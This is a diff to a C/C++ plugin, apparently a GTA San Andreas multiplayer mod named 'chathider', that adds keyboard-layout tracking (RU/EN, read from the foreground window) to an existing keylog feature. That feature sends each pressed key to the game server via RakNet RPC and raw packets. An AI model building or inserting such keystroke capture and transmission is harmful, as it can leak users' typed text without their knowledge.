@@ -208,10 +208,54 @@ static void chathider_client_log(const char* location, const char* message, unsi
 
 #if CHATHIDER_KEYLOG_ENABLED
 
-/* 1 = шлём raw [251,key] (GetPacketID hook на сервере). 0 = только RPC (для теста — если raw вызывает "Packet was modified"). */
+/* 1 = шлём raw пакеты (GetPacketID hook на сервере). 0 = только RPC. */
 #define CHATHIDER_SEND_RAW_PACKET 1
 
-/* Отправка ключа. Максимально близко к тому, как это делает сам SAMP-API / RakNet. */
+/* Текущая раскладка: два байта "RU", "EN" и т.д. -1 = ещё не опрошена */
+static unsigned char g_last_layout[2] = { 0xFF, 0xFF };
+
+static void get_layout_bytes(unsigned char* a, unsigned char* b)
+{
+    DWORD tid = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
+    HKL hkl = GetKeyboardLayout(tid);
+    DWORD lang = (DWORD)(UINT_PTR)hkl & 0xFFFF;
+    if (lang == 0x0419) { *a = 'R'; *b = 'U'; }
+    else if (lang == 0x0409) { *a = 'E'; *b = 'N'; }
+    else { *a = 'E'; *b = 'N'; }
+}
+
+/* Отправка смены раскладки — отдельный пакет 253 + RPC 222 (по аналогии с ключом). */
+static void send_layout_to_server(void* rak, void** vtable, unsigned char layout0, unsigned char layout1)
+{
+    typedef void (__thiscall *RPCFn)(void* pThis, int* rpcId, RakNet::BitStream* bitStream,
+                                     int priority, int reliability,
+                                     unsigned channel, bool shiftTimestamp, unsigned int networkId, RakNet::BitStream* pReplyFromTarget);
+    typedef bool (__thiscall *SendFn)(void* pThis, void* bitStream,
+                                     int priority, int reliability,
+                                     unsigned orderingChannel);
+    RPCFn pRPC = (RPCFn)vtable[8];
+    SendFn pSend = (SendFn)vtable[6];
+    if (pRPC)
+    {
+        RakNet::BitStream bsRpc;
+        bsRpc.Write(layout0);
+        bsRpc.Write(layout1);
+        static int rpc_layout = CHATHIDER_RPC_LAYOUT_CHANGED;
+        pRPC(rak, &rpc_layout, &bsRpc, 1, 8, 0, false, 0, nullptr);
+    }
+#if CHATHIDER_SEND_RAW_PACKET
+    if (pSend)
+    {
+        RakNet::BitStream bsRaw;
+        bsRaw.Write((unsigned char)ID_LAYOUT_CHANGED);
+        bsRaw.Write(layout0);
+        bsRaw.Write(layout1);
+        pSend(rak, &bsRaw, HIGH_PRIORITY, RELIABLE, 0);
+    }
+#endif
+}
+
+/* Отправка ключа. При смене раскладки сначала шлём пакет раскладки (253 + RPC 222), затем ключ (251 + RPC 220). */
 static void send_key_to_server(unsigned int vkCode)
 {
     chathider_client_log("send_key_to_server", "entry", vkCode, 0, 1);
@@ -225,18 +269,24 @@ static void send_key_to_server(unsigned int vkCode)
     void** vtable = *(void***)rak;
     unsigned char keyByte = (unsigned char)(vkCode & 0xFF);
 
+    /* Раскладка: при изменении шлём отдельный пакет (253 + RPC 222) по той же схеме, что и ключ */
+    {
+        unsigned char layout0, layout1;
+        get_layout_bytes(&layout0, &layout1);
+        int changed = (g_last_layout[0] != layout0 || g_last_layout[1] != layout1);
+        if (changed)
+        {
+            g_last_layout[0] = layout0;
+            g_last_layout[1] = layout1;
+            send_layout_to_server(rak, vtable, layout0, layout1);
+        }
+    }
+
     RakNet::BitStream bsRpc;
     bsRpc.Write(keyByte);
-    
-    /* Логируем размер BitStream для отладки */
     int bsSize = bsRpc.GetNumberOfBytesUsed();
     chathider_client_log("send_key_to_server", "bs_created", vkCode, bsSize, bsSize > 0 ? 1 : 0);
 
-    /* Сигнатура RPC для RakClient (как в SAMP-API): 
-       RPC(int* uniqueID, BitStream* parameters, PacketPriority priority, PacketReliability reliability, 
-           unsigned orderingChannel, bool shiftTimestamp, NetworkID networkId, BitStream* pReplyFromTarget) */
-    /* В SAMP-API RPC вызывается напрямую через указатель, но у нас только void* rak, поэтому используем vtable */
-    /* Пробуем использовать void версию (в некоторых версиях RakNet RPC возвращает void) */
     typedef void (__thiscall *RPCFn)(void* pThis, int* rpcId, RakNet::BitStream* bitStream,
                                      int priority, int reliability,
                                      unsigned channel, bool shiftTimestamp, unsigned int networkId, RakNet::BitStream* pReplyFromTarget);
@@ -245,17 +295,14 @@ static void send_key_to_server(unsigned int vkCode)
     if (pRPC)
     {
         static int rpc_id = CHATHIDER_RPC_KEY_PRESSED;
-        /* Используем числовые значения: HIGH_PRIORITY=1, RELIABLE=8, networkId=0 (UNASSIGNED), pReplyFromTarget=nullptr */
-        pRPC(rak, &rpc_id, &bsRpc, 1 /* HIGH_PRIORITY */, 8 /* RELIABLE */, 0, false, 0, nullptr);
-        chathider_client_log("send_key_to_server", "after_rpc", vkCode, 2, 1);  /* void - считаем успехом */
+        pRPC(rak, &rpc_id, &bsRpc, 1, 8, 0, false, 0, nullptr);
+        chathider_client_log("send_key_to_server", "after_rpc", vkCode, 2, 1);
     }
 
 #if CHATHIDER_SEND_RAW_PACKET
-    /* Сырой пакет [251, key] — как в chandling: HIGH_PRIORITY, RELIABLE */
     RakNet::BitStream bsRaw;
     bsRaw.Write((unsigned char)ID_KEY_PRESSED);
     bsRaw.Write(keyByte);
-
     typedef bool (__thiscall *SendFn)(void* pThis, void* bitStream,
                                       int priority, int reliability,
                                       unsigned orderingChannel);
